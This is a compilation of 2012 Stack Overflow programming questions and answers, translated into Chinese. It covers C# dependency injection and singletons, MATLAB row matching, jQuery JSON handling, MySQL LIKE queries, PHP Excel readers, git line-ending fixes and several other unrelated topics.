    <TextBox Name="txtname" Margin="12,12,12,0" Height="23" VerticalAlignment="Top" />
    <Button Content="Add Text" Margin="12,41,12,0" Name="button1" VerticalAlignment="Top" Click="button1_Click" />
</Grid> 
```

我很难理解互联网上解释这一点的教程。据我所知，有 3 种方法可以做到这一点（如果可能的话，将上面的代码转换为所有这三种方法的示例会很好）：

*   服务定位器
*   依赖注入
*   控制反转 (IoC)

解释我读过的东西的[文章非常好，但这些例子与我无关，因为他正在使用带有数据库连接字符串的 VB 和 ASP.Net。](http://grantpalin.com/2009/05/20/reducing-code-coupling-introduction/)这与我所需要的完全相反，我不想在学习概念的同时考虑如何翻译代码，也不想考虑如何将其应用到相关的东西上。虽然这个例子很好，但它太多了，我真的很感激任何额外的帮助。

编辑历史：更正拼写。添加以下内容以澄清我的问题：

我理解耦合和内聚背后的理论，以及为什么你应该减少一个并增加另一个。但是我们在大学里从来没有编写过任何例子。另外，虽然在大学里没有涉及，但我确实了解接口。但是，我不明白如何使用它们来减少耦合。

添加了[我上面引用的文章](http://grantpalin.com/2009/05/20/reducing-code-coupling-introduction/)的链接。

编辑2：到目前为止，我现在得到的是以下内容：

```
public interface IPerson 
{ 
    string Name { get; set; } 
    string PersonAddText(string text); 
} 

public class Person : IPerson 
{
    //The code from the person class above
} 
```

我现在如何在后面的主窗口代码中使用它？我想我应该更换

```
Person x = new Person(); 
```

和

```
IPerson x = new Person(); 
```

这是正确的吗？如果是，我还需要做什么。我问的原因是因为我仍然没有看到 Visual Studio 报告的代码耦合数字有任何减少（事实上，它在后面的主窗口代码上增加了 1）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:11:58.387

**编辑**

我很高兴我的回答有所帮助，让我进一步更新一下。要将您的问题用作直接答案，您需要更改的只是您的字段声明：

```
Person x = new Person(); 
```

到

```
IPerson x = new Person(); 
```

您的代码隐藏现在知道在您的接口中指定的属性和方法，并且耦合少了很多，因为您可以`new Person()`在`new Student()`以后换掉。只要对象实现了接口。**您的代码隐藏现在应该可以在没有任何必要更改的情况下工作。**

***边注***

我建议考虑延迟加载此`x`人，并使用名称更容易识别的属性。注意，这并不能回答您的问题，而只是一个建议。:)

```
private IPerson _CurrentPerson = null;
private IPerson CurrentPerson
{
    get
    {
        if (this._CurrentPerson == null)
        {
            this._CurrentPerson = new Person();
        }
        return this._CurrentPerson
    }
    set
    {
        this._CurrentPerson = value;
    }
} 
```

* * *

解耦是指两个或更多代码块不应相互依赖。控制反转是指对象的耦合在运行时绑定，从而允许对象及其实例具有更大的灵活性，从而减少耦合。控制反转最好与接口结合使用。接口定义了`ClassA`将做`MethodX`和拥有`PropertyY`. 我们的主要对象并不关心在运行时返回什么对象，因为它可以实现接口，它很高兴。

在上面的示例中，您将希望连接您的人员类，可能是这样的：

```
public interface IPerson
{
    string Name { get; set; }
    string PersonAddText(string text);
}

public class Person : IPerson
{
    // your code here
} 
```

然后，在您的主要方法调用中`Person`，您将使用实现接口的对象实例，而不是显式使用对象`IPerson`。接口和对象的“连接”可以通过各种不同的库来实现，这将有助于设置您的依赖关系。根据我的经验，我使用过[StructureMap](http://docs.structuremap.net/)和[Microsoft 的 Enterprise Library](http://msdn.microsoft.com/en-us/library/ff648951.aspx)。它们的设置可能有点繁琐，但是一旦它们设置好了，你就可以做这样的事情......

```
public void MainMethod_InInterfaceLayer()
{
    // container is an instance of UnityContainer
    Person newPerson = container.Resolve<IPerson>();
} 
```

我知道这不是一个完整的答案，但希望它会有所帮助。:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T11:15:25.887

假设您有一个`IPerson`接口和几个实现（`Person`,等） `Student`，`Teacher`并且您有一些只需要在`IPerson`.

有：

```
IPerson x = new Person(); 
```

在你的代码后面强烈地将它与`Person`类耦合。

控制反转通过让依赖项来自外部而不是在类内部创建来发挥作用。

这通常是通过使用依赖注入来实现的——`IPerson`传递给类而不是直接创建它的类。您可以通过将实例传递给构造函数（构造函数注入）或作为属性（属性注入）来实现。

服务定位器是另一种无需硬编码即可获得依赖关系的方法——该模式“定位”类型/接口的实例。

如何将依赖项注入类的示例：

```
public class MyClass
{
  IPerson person;

  public MyClass(IPerson p)
  {
    person = p; // injected an instance of IPerson to MyClass
  }

  // can now use person in any method of the class, or pass it around:

  public void MyMethod()
  {
     string name = person.Name;
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:15:44.197

假设您有一个 Person 类，它可以从数据库中加载自身、进行更改并在他或她去世时发送电子邮件。

```
class Person 
{
    ...
    void LoadUsingId(int id);
    void HaveDiedWillMail();
    void SetFirstName(string name);
    ...
} 
```

你在这里可以看到这个人实际上在做三件事（至少！）。

它知道如何与数据库对话以加载自身。它知道如何发送电子邮件。它可以改变自己。

任何代码，理论上如果不实践，应该只对一件事负责。为了减少这些组件之间的耦合，您必须将它们分开。将它们解耦，以便它们可以独立工作。

```
class Person 
{
    ...
    void LoadUsingId(PersonRepository person);
    void HaveDiedWillMail(IMailer mailer);
    void SetFirstName(string name);
    ...
} 
```

在这个人为的示例中，Person 不知道如何从数据库中加载某些内容。忽略 -loading- 也是您应该解耦的事实。邮件发送也被解耦了，因为你告诉`Person.HaveDiedWillMail`你你想使用一个特定的邮件程序 ( `IMailer mailer`)。

依赖注入、服务容器和此类技术会自动找到您的 Person 需要/想要运行的组件，这是在解耦之上的额外层，以便更容易地将所有单独的部分连接在一起。

# matlab - 在矩阵中查找匹配的行

> ID：10514709
> 
> 赞同：12
> 
> 时间：2012-05-09T10:58:36.880
> 
> 标签：matlab

假设我有一个 (mxn) 矩阵 Q 和一个行向量 r，例如

```
Q = [ 1 2 3 ; 4 2 3 ; 5 6 7 ; 1 2 3 ; 1 2 3 ; 1 2 5 ];

r = [ 1 2 3 ]; 
```

获得一个逻辑向量（长度为 m）的最简单方法是什么，该向量指示 Q 中的哪些行（对于所有元素）与指定的行 r 相同？

在上面的示例中，应该是

```
[ 1 0 0 1 1 0 ]; 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-09T11:30:57.877

您可以[`ismember`](http://www.mathworks.com/help/techdoc/ref/ismember.html)在一行中使用并执行此操作：

```
>> ismember(Q,r,'rows')'

ans =

     1     0     0     1     1     0 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-05-09T11:00:40.950

```
all(bsxfun(@eq, r, Q),2)' 
```

`bsxfun(@eq, r, Q)`比较每一行并返回一个与 Q 大小相同的矩阵：

```
>> bsxfun(@eq, r, Q)

ans =

   1     1     1
   0     1     1
   0     0     0
   1     1     1
   1     1     1
   1     1     0 
```

该`all`函数计算 bsxfun 的结果是否分别沿每一行都为真。因此它返回：

```
>> all(ans,2)'

ans =

   1     0     0     1     1     0 
```

是的，还有一个转置运算符`'`来匹配您想要的行输出

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-04-24T18:19:18.237

```
a = [1 1 1; 2 2 2; 3 3 3];
b = a(1:2,;);
[temp locb] = ismember(a,b,'rows');
b(locb(locb~=0),:)

ans =

     1     1     1
     2     2     2 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:06:06.143

Easier way with `repmat`:

```
a = [1 2 3; 4 5 6; 7 8 9];
t = [4 5 6];
[x,y] = size(a);
r = all(a==repmat(t,y,1), 2)' 
```

# javascript - 按键输出 JSON 对象

> ID：10514714
> 
> 赞同：0
> 
> 时间：2012-05-09T10:58:49.133
> 
> 标签：javascript, jquery, ajax, json

我有一个如下所示的 JSON 字符串：

```
{"cat1":"m1","cat2":["d1","d2","d3"],"cat3":["m1","m2","m3","m4"]} 
```

在 Javascript 中，我试图按类别（cat1-3）输出字符串，这是我到目前为止的代码。

```
$.post(loadUrl, function(data){

    $("#result").html("<p>Cat1: " + data.cat1 + "</p><p>Cat2: " + data.cat2 + "</p>");

}); 
```

我通常不会使用 JSON（通常是 JSTL），但因为我想学习 AJAX，所以我想尝试通过键输出 cat1-3 值，我一直得到“未定义”。

我以此作为获取值的指南：[http ://www.skill-guru.com/blog/2010/01/27/json-javascript-tutorial/](http://www.skill-guru.com/blog/2010/01/27/json-javascript-tutorial/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:55:21.783

Try below script

```
va response =  {"cat1":"m1","cat2":["d1","d2","d3"],"cat3":["m1","m2","m3","m4"]}

var obj = jQuery.parseJSON(response);

alert(obj.cat1); 
```

it will return m1

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:11:27.487

```
var a = JSON.parse("{\"cat1\":\"m1\",\"cat2\":[\"d1\",\"d2\",\"d3\"],\"cat3\":[\"m1\",\"m2\",\"m3\",\"m4\"]}"); 

for(key in a)
{
     alert(key);
     alert(a[key]); 
} 
```

# joomla - URL 中的 Joomla 2.5 语言代码。如何禁用？

> ID：10514718
> 
> 赞同：0
> 
> 时间：2012-05-09T10:58:57.707
> 
> 标签：joomla, joomla1.7

我有内置多语言系统的 Joomla 2.5。主要语言是俄语，其次是英语。在 2 篇具体文章中，我有 src="/freeflight2/form.php" 的 iframe。在网站的俄语版本中，iframe 加载正确。但是在英语中，我得到了带有语言代码的 iframe 的 URL：[http://xxx/en/freefligh2/en/form.php](http://xxx/en/freefligh2/en/form.php)导致 404。

我也尝试编写完整的 url，但 Joomla 再次插入语言代码。

有什么办法可以解决吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T13:14:09.560

这是习俗还是在 Joomla 中？如果自定义，您是否尝试过使用 JPATH 获取基本路径？如果在 Joomla 中，您是否使用 JCE 之类的编辑器来创建 iframe？

# java - java - 如何在java中使用html解析器制作带有div内容的过滤器

> ID：10514721
> 
> 赞同：2
> 
> 时间：2012-05-09T10:59:09.770
> 
> 标签：java, html, filter, html-parsing

我正在尝试使用 htmlparser 库解析 HTML 字符串。html是这样的：

```
<body>
        <div class="Level1">
            <div class="row">
                <div class="txt">
                    Date of analysis:
                </div><div class="content">
                    02/03/11
                </div>
            </div>
        </div><div class="Level1">
            <div class="row">
                <div class="txt">
                    Site:
                </div><div class="content">
                    13.0E
                </div>
            </div>
        </div><div class="Level1">
            <div class="row">
                <div class="txt">
                    Network type:
                </div><div class="content">
                    DVB-S
                </div>
            </div>
        </div>
</body> 
```

我需要为给定的“txt”提取“内容”信息。我已经制作了一个过滤器，它返回带有 class="level1" 的 div，但我不知道如何使用 div 的内容制作过滤器，我的意思是如果 txt 的值为 Site: 然后读取 13.0 之类的内容E.

```
 NodeList nl = parser.extractAllNodesThatMatch(new AndFilter(new TagNameFilter("div"), new HasAttributeFilter("class", "Level1"))); 
```

有人可以帮我解决这个问题吗？如何在 div 中读取 div？谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:05:50.507

```
NodeList nl = parser.extractAllNodesThatMatch(new AndFilter(new TagNameFilter("div"), new HasAttributeFilter("class", "Level1"))); 
```

better to do it like this:

```
NodeList nl = parser.parse(null); // you can also filter here

NodeList divs = nl.extractAllNodesThatMatch(
  new AndFilter(new TagNameFilter("DIV"), 
    new HasAttributeFilter("class", "txt")));

if( divs.size() > 0 ) {
  Tag div = divs.elementAt(0);
  String text = div.getText(); // this is the text of the div
} 
```

# mysql - 用两个搜索词搜索 mysql

> ID：10514724
> 
> 赞同：0
> 
> 时间：2012-05-09T10:59:19.587
> 
> 标签：mysql, database

对mysql来说是全新的。我希望这很容易。只想搜索结果

现场火和 poi。

因此，这将排除单独使用火或单独使用 poi 的结果。

```
SELECT * FROM isc_products WHERE prodname like '%$search%' LIMIT 100 
```

我尝试了AND，它可以带回结果。

希望这是有道理的，并且是一件容易实现的事情。

非常感谢杰森

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:01:35.393

您需要重复整个条件。不确定这是否是您正在做的，但以下将起作用。

```
SELECT * FROM isc_products 
WHERE prodname LIKE '%fire%' 
AND prodname LIKE '%poi%' LIMIT 100 
```

顺便提一句; 如果您在一个 $string 中同时包含这两个术语，那么您将需要手动将它们分开并按上述方式格式化查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:03:51.010

如果您想要包含其中一个术语或两者的结果，请使用它（用您的变量替换搜索术语；用空格字符分割给定的搜索术语，然后动态创建 OR 部分）：

```
SELECT * FROM isc_products WHERE prodname LIKE '%fire%' OR prodname LIKE '%poi%' LIMIT 100 
```

# c# - 如何在c#中返回一个静态类实例

> ID：10514729
> 
> 赞同：9
> 
> 时间：2012-05-09T10:59:34.383
> 
> 标签：c#, singleton

我想获得一个静态类的实例，但如果不在非静态类上实现单例包装器，我似乎无法做到这一点——这可能吗，还是我遗漏了什么？

```
public class MyInstanceTester
 {
    public MyInstanceTester()
    {
        //this is how i get a reference to a singleton now
        MyClass instance1 = MyClass.Instance();
        //this is what is would like to do (if only the compiler would let me)
        MyStaticClass instance2 = MyStaticClass.Instance();
    }
}

public class MyClass
{
    private static MyClass _myInstance;

    static MyClass()
    {
        _myInstance = new MyClass();
    }

    public static MyClass Instance()
    {
        return _myInstance;
    }

}

public static class MyStaticClass
{
    public static MyStaticClass Instance
    {
        get
        {
            return this;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-09T11:01:11.833

没有静态类的实例。单例模式只是将类的相同实例返回给重复的请求。

您可能会对以下内容感到困惑：

```
private static MyClass _myInstance; 
```

这仅仅意味着在所有实例化类型为 _myInstance 作为成员的对象中，将存在该特定对象的单个实例。

几点注意事项：

*   关键字在`this`静态成员中无效
*   如果您有一个静态类，那么所有成员都必须是静态的，因此`this`永远不会有效
*   单例类不能是静态类
*   单例声明一个静态成员以帮助确保该类只存在一个实例
*   请注意，对对象的静态引用不会使对象成为静态的。只有引用是静态的

**进一步阅读： Jon Skeet 有一篇关于**[在 C# In Depth 中](http://csharpindepth.com/Articles/General/Singleton.aspx)实现单例的出色文章。我建议您阅读和研究这篇文章，直到您理解它为止。这是相当不错的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T11:03:28.000

没有理由返回 a `instance to a static class`（如果类是静态的，则没有实例）。

您可以从任何地方访问该课程，为什么要返回`instance`它？我想不出有什么理由这样做。

### 静态类使用

要使用静态类，只需将其编写如下：

```
MyStaticClass.MyMethod();
Int32 callCount = MyStaticClass.CallCount; 
```

如您所见，声明变量甚至没有意义，因为它看起来像这样：

```
MyStaticClass msc = MyStaticClass.Instance();
msc.MyMethod();
Int32 callCount = msc.CallCount; 
```

如果你想有一个更短的名字，你可以使用：

```
 using MSC = MyNamespace.MyStaticClass; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-09T14:53:23.323

根据您的评论，我认为您的解决方案是：

使您的课程非静态。（只需保持方法静态。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:04:02.400

你的术语是错误的。请阅读[有关静态关键字的 MSDN 文章](http://msdn.microsoft.com/en-us/library/98f28cdx%28v=vs.71%29.aspx)。

> 不能通过实例引用静态成员。相反，它是通过类型名称引用的。

[单例](http://en.wikipedia.org/wiki/Singleton_pattern)是一个类，它只允许它自己的单个实例。在 C# 中对此的一个常见含义是：

```
public class MyClass
{
    private MyClass _value = null;

    public MyClass Value {
        get { return _value ?? (_value = new MyClass()); }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-09T11:05:06.183

主要问题在这里：

```
public static class MyStaticClass 
{     
    public static MyStaticClass Instance
    {         
         get
             {             
                  return this; //compile time error!
             }
    }
} 
```

`this`指在静态类中没有意义的类的实例，因为不能有实例。这本身就应该让您意识到您所问的问题存在一个基本错误：“我想获得一个静态类的实例”。您不能返回静态类的实例，因为根据定义，静态类不能被实例化。

单例模式只是确保你总是返回一个类的*同一个*实例。但是所说的类永远不能是静态的。

# php - Excelwriter 和 phpExcelReader 2 无法读取文件

> ID：10514736
> 
> 赞同：2
> 
> 时间：2012-05-09T11:00:29.157
> 
> 标签：php, excel, pack, spreadsheet-excel-writer

我使用[Harish Chauhan 的 Excel Writer](http://www.phpclasses.org/package/2037-PHP-Generate-spreadsheet-files-Excel-xls-XML-format.html)生成一个 excel (xls) 文件。

然后我使用[phpExcelReader 2](http://code.google.com/p/php-excel-reader/)读取由 Excel Writer 类创建的文件，但一直出现此错误：

**`The filename myXls.xls is not readable`**

我可以用 MS Excel 打开“myXls.xls”文件。但是如果我用另一个名字保存文件，它可以成功读取。

尝试探索代码，似乎错误是由：

```
if (substr($this->data, 0, 8) != IDENTIFIER_OLE) {
    //echo 'Error';
    $this->error = 1;
    return false;
} 
```

IDENTIFIER_OLE 被定义：

```
define('IDENTIFIER_OLE', pack("CCCCCCCC",0xd0,0xcf,0x11,0xe0,0xa1,0xb1,0x1a,0xe1)); 
```

我不知道如何解决它。请帮忙。

谢谢你的时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T19:17:07.837

Harish Chauhan 的 ExcelWriter 类生成的文件不是真正的 OLE BIFF .xls 文件，而是 HTML 标记和 SpreadSheetML 中的一些元素的混合体，SpreadSheetML 是 Microsoft 定义的 XML 格式，可替代 Excel 2003 中的 BIFF。事实证明它从未特别流行; 但是更高版本的 MS Excel 本身仍然可以读写这种格式。MS Excel 对阅读 HTML 标记也非常宽容，尽管最新版本会在文件格式与其扩展名不匹配时通知您。

phpExcelReader 2 是为读取 Excel BIFF 文件而编写的，因此它无法读取由 Harish Chauhan 的类生成的非 OLE/非 BIFF 文件。

如果您想以正确的格式写入和读取文件，那么我建议您使用[PHPExcel ，或者](http://www.phpexcel.net)[使用真正的 Excel 文件](https://stackoverflow.com/questions/3930975/alternative-for-php-excel)的许多其他PHP 库之一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-15T14:42:05.980

我有同样的问题。任务是解析非常旧的 XLS 文件 (Excel2)。我在 PHP 中找不到任何适用于这种旧格式的库。

所以解决方案是**使用 LibreOffice**命令行转换为 XLSX（也适用于 CSV），然后使用任何“现代”Excel 解析器对其进行解析。

我们在服务器中安装了 LibreOffice，这是要转换的命令：

```
libreoffice --headless --convert-to xlsx original_source.xls 
```

或者

```
libreoffice --headless --convert-to csv original_source.xls 
```

# php - Twitter Hashtags RSS 提要

> ID：10514742
> 
> 赞同：-5
> 
> 时间：2012-05-09T11:00:41.157
> 
> 标签：php, javascript, twitter, rss, hashtag

我一直在互联网上搜索一个有效的推特标签 rss 提要。但是它们都已过时/不起作用。例如，使用 "#EK2012" 回显所有推文。如果有人可以帮助我，我会学徒。

（它在我的新网站上）

问候。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-10T05:18:51.957

给你： [http ://search.twitter.com/search.rss?q=%23EK2012](http://search.twitter.com/search.rss?q=%23EK2012)

# javascript - 如何在表单加载时显示第一条消息，并在 1 分钟后显示下一条消息？

> ID：10514749
> 
> 赞同：1
> 
> 时间：2012-05-09T11:01:16.653
> 
> 标签：javascript

因为我对 javascript 了解不多，所以我需要你的帮助。我的问题是这样的：

我使用 setInterval() 来增加`i`每 1 分钟后的值，我正在使用以下代码：

```
var i = minutes;
function decrementMin() {
    if(i>=0)
    {
        i--;
    }
    if(i==0)
    {
        alert('Minute = Congratulation your time begin now!');
    }                         
    document.getElementById('minutes').innerHTML = i + "minutes";
}
setInterval('decrementMin()',60000); 
```

问题是我想在`<div id='minutes'></div>`页面加载时显示第一条消息，但它会在 1 分钟间隔后显示消息。如果我的代码中缺少某些内容，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:09:06.670

您的问题是您正在设置显示第一条消息之前的间隔。相反，您可以立即调用该函数，然后设置间隔。此外，一旦达到 0，您需要清除间隔：

```
var i = minutes;
var intID;
function decrementMin() {
    if(i>=0)
    {
        i--;
    }
    if(i==0)
    {
        clearInterval(intID);
        alert('Minute = Congratulations my friend your time begins now!');
    }
    document.getElementById('minutes').innerHTML = i + "minutes";
}

decrementMin();
intID = setInterval(decrementMin, 60000); 
```

这样您就可以立即调用您的函数，然后将其设置为每分钟运行一次。一旦达到 0，就清除间隔，以便函数不计为“-1”等。

# git - 将文本文件从 LF 行结尾批量转换为 CRLF

> ID：10514750
> 
> 赞同：5
> 
> 时间：2012-05-09T11:01:17.703
> 
> 标签：git, dos2unix

我有一个使用 git (1.7.10.msysgit.1) 进行版本控制的 vb.net (visual studio 2010) 项目。我犯了一个错误，在 git 中离开`core.autocrlf`为 true。现在我已设置`core.autocrlf`为 false，但源代码已在存储库中转换为 LF 行结尾。我想将行尾改回 CRLF。

我纠正这种情况的计划是：

1.  git 克隆
2.  删除克隆中的所有源代码文件
3.  git 结帐 -f
4.  将所有 LF 转换为 CRLF
5.  git 提交
6.  git pull 从原始仓库

我在第 4 步遇到问题。项目中有很多文件，希望有一个工具可以将所有文本文件批量转换为 CRLF 行结尾。

我已经尝试过`dos2unix`在 git bash 中可用，但看起来它不会处理子文件夹，它告诉我文本文件`looks binary`.

那么，将我的源代码批量转换回 CRLF 行结尾的最佳方法是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-30T12:18:04.373

我采取了 Endy 的步骤，但将其缩减为仅使用一个存储库：

```
1\. git config core.autocrlf true
2\. delete all files in your working tree (except the .git folder for sure)
3\. git checkout -f
4\. git config core.autocrlf false
5\. git commit -am "corrected all line endings from LF to CRLF" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T11:34:37.417

我错过了明显的方式：

1.  git clone 到文件夹 A. git config core.autocrlf false
2.  git clone 到文件夹 B. git config core.autocrlf true
3.  从文件夹 B 中删除所有源文件
4.  文件夹 B 中的 git checkout -f
5.  将文件夹 B 中的所有文件和文件夹剪切并粘贴到文件夹 A
6.  文件夹 A 中的 git 提交
7.  从原始存储库 git pull

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-01-16T18:36:27.837

Christoph 的回答几乎对我们有用，但由于某种原因 git 错过了一堆文件。（我们使用的是 2.20 版）。我们不得不强制 git 通过“git read-tree --empty”重新扫描所有内容。执行此操作后，某些文件显示为“删除”，这是不正确的，但在重置并添加后对我们有用。

```
1\. git config core.autocrlf true
2\. delete all files in your working tree (except the .git folder for sure)
3\. git checkout -f
4\. git config core.autocrlf false
5\. git read-tree --empty
6\. git add .
7\. git reset
8\. git add .
9\. git commit -m "corrected all line endings from LF to CRLF" 
```

# svn - SVN 可以在 MS Windows 下使用斜杠“/”作为路径分隔符吗？

> ID：10514753
> 
> 赞同：3
> 
> 时间：2012-05-09T11:01:32.040
> 
> 标签：svn

在 MS windows 命令提示符下，当你键入一个 svn 命令时，例如：svn status。它将显示更改状态和路径名。但它使用“\”作为路径分隔符。

有没有办法使用“/”作为路径分隔符？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2017-09-04T06:51:52.500

在这个答案中，我们将添加一个新命令，该命令`svnst`在 bash 命令行上调用。

为此，请`~/.bashrc`使用编辑器打开。

```
vi ~/.bashrc 
```

并在文件末尾添加

```
function svnst() { svn status $@ | sed 's:\\:/:g'; } 
```

保存文件后，打开一个新的 bash 命令外壳，以便更改生效。

[如果您在保存和退出](https://stackoverflow.com/a/11828573/406423)vi时遇到问题，请阅读[此处。](https://stackoverflow.com/a/11828573/406423)

[从这里的另一个答案](https://stackoverflow.com/a/10514818/406423)中公然复制了[Gedrox](https://stackoverflow.com/users/369330/gedrox)的评论，这*几乎*可以工作。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:05:14.310

一种解决方案（也许不是最好的）是`svn`在`cygwin`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-02-04T21:14:15.833

我错误地认为 svnstat 会被 svn 接收。经过仔细检查，@MadMike 解决方案对我有用，但我需要像这样使用别名：

```
svnst -u 
```

谢谢@MadMike*

# java - 使用 JDOM API 删除 XML 属性？

> ID：10514756
> 
> 赞同：0
> 
> 时间：2012-05-09T11:01:53.977
> 
> 标签：java, xml, jdom

我有一个 JDOM 元素，如下所示

**示例：XML（JDOM 元素）**

```
<Details>
<Uniqueno>11111</Uniqueno>
<ROWSET name="Persons">
<ROW num="1">
<Name>60821894</Name>
<Age>938338789</Age>
</ROW>
<ROW num="2">
<Name>60821894</Name>
<Age>938338789</Age>
</ROW>
</ROWSET>
</Details> 
```

我想像这样转换：

```
<Details>
<Uniqueno>11111</Uniqueno>

<ROW num="1">
<Name>60821894</Name>
<Age>938338789</Age>
</ROW>
<ROW num="2">
<Name>60821894</Name>
<Age>938338789</Age>
</ROW>

</Details> 
```

**注意：ROWSET 元素被移除**

我想使用 JDOM API 删除元素？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:06:31.387

你已经尝试过什么？

1.  查找`Details`标签（即文档根目录）
2.  找到`ROWSET`标签
3.  对于每个`ROW`标签，`ROWSET`调用`detach()`节点上的方法，并将`append()`这个分离的节点传递给`Details`标签。
4.  删除`ROWSET`标签。

使用一些示例代码：

```
// 1
Element details = doc.getRootElement();
// 2
Element rowset = details.getChild("ROWSET");
// 3
for (Element row: rowset.getChildren()) {
    Element r = row.detach();
    details.appendChild(r);
}
// 4
details.removeChild(rowset); 
```

未经测试，有关更多信息，请查看[JDOM API](http://www.jdom.org/docs/apidocs/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:20:15.823

如果您使用的是 JDOM 2.0.x，您可以执行以下操作：

```
for (Element rowset : details.getChildren("ROWSET")) {
    rowset.detach();
    for (Content c : rowset.getContent()) {
         details.addContent(c.detach());
    }
} 
```

如果您使用的是 JDOM 1.x，您可以做类似的事情，但需要更多的演员......

# c# - 双击进度条后打开的窗口被立即拖入背景

> ID：10514767
> 
> 赞同：1
> 
> 时间：2012-05-09T11:02:17.783
> 
> 标签：c#, wpf, windows, winapi, topmost

我有一个非对话框窗口，在用户双击进度条后打开。

每次打开时，它都会短暂停留在前台，然后将其拖入后台（隐藏在主应用程序窗口的后面，即带有进度条的窗口）。

我想让它保持在顶部窗口，我不想让它成为最顶部的。

我该怎么做呢？

我在 WPF 4 和 c# 中写这个

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T11:05:37.267

将窗口设置[`Owner`](http://msdn.microsoft.com/en-us/library/system.windows.window.owner.aspx)为主窗口。

# javascript - 如何在道场中检查组合框

> ID：10514769
> 
> 赞同：1
> 
> 时间：2012-05-09T11:02:18.373
> 
> 标签：javascript, combobox, dojo

我想要一个组合框，每个项目前面都有一个复选框，我可以在其中选择多个值。

有没有..？？请帮助

（我在extjs中使用了Lovcombo，有没有类似的小部件？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T17:15:22.653

`dojox.form.CheckedMultiSelect`看起来像：

![在此处输入图像描述](../Images/088908befc7ae9262a58fdcded340bf6.png)

它具有属性`dropdown`-将其设置为`true`，您将获得：

![在此处输入图像描述](../Images/41c329aaa1502ca8451f194fe4e2cb36.png)

不幸的是，存在一些样式问题，因为您看不到检查了哪些项目，但也许您可以立即修复它。

# c - 比较字符

> ID：10514770
> 
> 赞同：-2
> 
> 时间：2012-05-09T11:02:24.650
> 
> 标签：c

对于我的文字游戏，我正在比较单词中的字符，第一个单词中的 6 个，随机单词中的 6 个。

现在我希望它在某些字母出现时做一些事情。

例如，如果

```
(aChar1 == aChar7 && aChar2 == aChar8){
//do something
} 
```

但后来在我的代码中有

```
(aChar1 == aChar7 && aChar2 == aChar8 && aChar3 == aChar9){
//do something
} 
```

现在我只希望发生第二个代码行而不是第一个代码行，因为只有前两个代码行到位。我需要添加如下代码：

```
(aChar1 == aChar7 && aChar2 == aChar8 && aChar3 isnotequalto aChar9){
//do something
} 
```

我应该使用什么代码来表示不相等？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:05:45.987

使用它并告诉我它是否有效 achar3!=achar9

# javascript - 如何使用 Javascript 或在客户端获取设备（iOS、Android）CPU 和内存

> ID：10514774
> 
> 赞同：0
> 
> 时间：2012-05-09T11:02:38.483
> 
> 标签：javascript, android, ios, cpu, ram

如何使用 Javascript 或在客户端获取设备（iOS、Android）的 CPU 和内存。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:05:35.503

While there's a lot of iOS and Android devices, it's possible to maintain a database of user agent strings and their mappings to devices, and therefore their CPU and RAM. This won't be 100% perfect but its the best I can think of.

# html - 如果可能，调整 Div 纯 CSS 的大小

> ID：10514776
> 
> 赞同：0
> 
> 时间：2012-05-09T11:02:41.913
> 
> 标签：html, css

我有以下 HTML 结构：

```
<div class="outer">
<div class="inner">
<a href="#"/>
<a href="#"/>
<a href="#"/>
</div>
</div> 
```

和 CSS：

```
div.outer{
    position:relative;
    height:177px;
    width: 495px;
    margin: 0 10px 0 10px;
    overflow: hidden;
} 
div.inner{
    position: absolute; 

} 
```

如何动态调整外部 div 的大小？高度最小值-最大值不起作用。谢谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:24:52.773

为了让它按照我认为你希望它工作的方式工作，那么你需要使用所有三个声明：`min-height`,`height`和`max-height`,`height`是一个相对度量，`min-height`and`max-height`都用于将相对大小限制到适当的最小值或最大。例如：

```
.outer {
    overflow: auto;
    margin: 0 auto;
    width: 50%;
    border: 2px solid #000; /* The above just for aesthetics, adjust to change */
    min-height: 100px;
    height: 50%;
    max-height: 1000px;
} 
```

[JS 小提琴演示](http://jsfiddle.net/NR72p/1/)

在演示中，调整窗口大小以使“预览”窗格展开/收缩以查看效果。

# objective-c - 在 Objective-C 中解析 XML 文件

> ID：10514778
> 
> 赞同：0
> 
> 时间：2012-05-09T11:02:48.437
> 
> 标签：objective-c, ios, xml, parsing, xml-parsing

